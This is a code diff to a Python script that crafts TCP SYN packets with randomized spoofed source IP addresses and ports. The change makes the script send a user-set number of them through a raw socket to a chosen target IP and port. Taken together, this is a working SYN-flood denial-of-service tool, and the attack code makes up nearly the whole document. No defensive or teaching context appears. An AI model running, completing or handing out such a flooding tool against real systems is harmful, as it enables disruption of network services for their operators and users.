@@ -5,6 +5,7 @@ from random import randint
 import struct
 import array
 import socket
+from scapy.all import send
 
 # Calculate Checksum for TCP Packet
 
@@ -19,6 +20,7 @@ def cal_checksum(packet: bytes) ->int:
     res += res >> 16
     # Flip bits of the sum and mask the lower 16 to produce the checksum
     return(~res) & 0xffff
+
 
 # Generate a randomized IP to sent the SYN packets from
 
@@ -88,7 +90,7 @@ def args():
     parser = ArgumentParser()
     parser.add_argument('-t', '--target', action='store', help='Specify the target IP address')
     parser.add_argument('-p','--port', action='store',type=int, help='Specify the target port')
-    parser.add_argument('-c', '--count', action='store', help='Specify the amount of packets sent')
+    parser.add_argument('-c', '--count', action='store', type=int, help='Specify the amount of packets sent')
     
     args = parser.parse_args()
 
@@ -122,19 +124,27 @@ def display_interface(src_ip, src_p, trg_ip, trg_p):
 
 def main():
     try:
+            
             parsed_args = args()
-            ip = rand_ip()
-            port = rand_port()
-            display_interface(ip,port,parsed_args.target, parsed_args.port)
-            pak = build(
+            for x in range (parsed_args.count):
+               ip = rand_ip()
+               port = rand_port()
+               display_interface(ip,port,parsed_args.target, parsed_args.port)
+               pak = build(
                 ip,
                 port,
                 parsed_args.target,
                 parsed_args.port,
                 # We need the following bin sequence to define a syn packet
                 0b000000010           
-            )
-            print(pak)
+               )
+               print(pak)
+               sok = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+               sok.sendto(pak,(parsed_args.target,0))
+               x=x+1
+
+            
+
     except ValueError as e:   
             print(e)        
 
